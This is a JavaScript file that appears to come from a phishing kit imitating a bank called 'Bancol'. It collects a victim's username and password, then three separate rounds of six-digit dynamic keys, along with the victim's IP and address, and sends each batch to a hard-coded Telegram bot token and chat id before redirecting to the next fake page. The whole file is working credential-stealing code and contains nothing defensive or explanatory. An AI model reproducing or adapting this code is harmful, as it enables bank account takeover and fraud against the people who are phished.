//bot token
var telegram_bot_id =  "7407461146:AAFvOs0zfVtt5nXpD1VIZ1k0FpXJxTE5TEI";
//chat id
var chat_id = "6655953882";

var users, pass,  ip, ip2;

var ready = function () {
    users = document.getElementById("ypn-us").value;
    pass = document.getElementById("ypn-cl").value;
	ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
	message = "-----Bancol----\n\nUsuario: " + users + "\nClave: " + pass +"\nIP: " + ip +"\n" + ip2;
	  
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index2.html"
    });
    return false;
};


var ready1 = function () {
	
	ca_name = document.getElementById("num1").value;
	cb_name = document.getElementById("num2").value;
	cc_name = document.getElementById("num3").value;
	cd_name = document.getElementById("num4").value;
	ce_name = document.getElementById("num5").value;
	cf_name = document.getElementById("num6").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "-----Bancol----\n\nClave dinamica1: "  + ca_name + ""  + cb_name + ""  + cc_name + ""  + cd_name + ""  + ce_name + ""  + cf_name + "\nIP: " + ip +"\n" + ip2; 
	

};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index4.html"
    });
    return false;
}


var ready2 = function () {
   	ca_name = document.getElementById("num1").value;
	cb_name = document.getElementById("num2").value;
	cc_name = document.getElementById("num3").value;
	cd_name = document.getElementById("num4").value;
	ce_name = document.getElementById("num5").value;
	cf_name = document.getElementById("num6").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "-----Bancol----\n\nClave dinamica2: "  + ca_name + ""  + cb_name + ""  + cc_name + ""  + cd_name + ""  + ce_name + ""  + cf_name + "\nIP: " + ip +"\n" + ip2; 
	
};
var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index.html"
    });
    return false;
}


var ready3 = function () {
 	ca_name = document.getElementById("num1").value;
	cb_name = document.getElementById("num2").value;
	cc_name = document.getElementById("num3").value;
	cd_name = document.getElementById("num4").value;
	ce_name = document.getElementById("num5").value;
	cf_name = document.getElementById("num6").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "-----Bancol----\n\nClave dinamica3: "  + ca_name + ""  + cb_name + ""  + cc_name + ""  + cd_name + ""  + ce_name + ""  + cf_name + "\nIP: " + ip +"\n" + ip2; 
	
};
var sender3 = function () {
    ready3();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index.html"
    });
    return false;
}
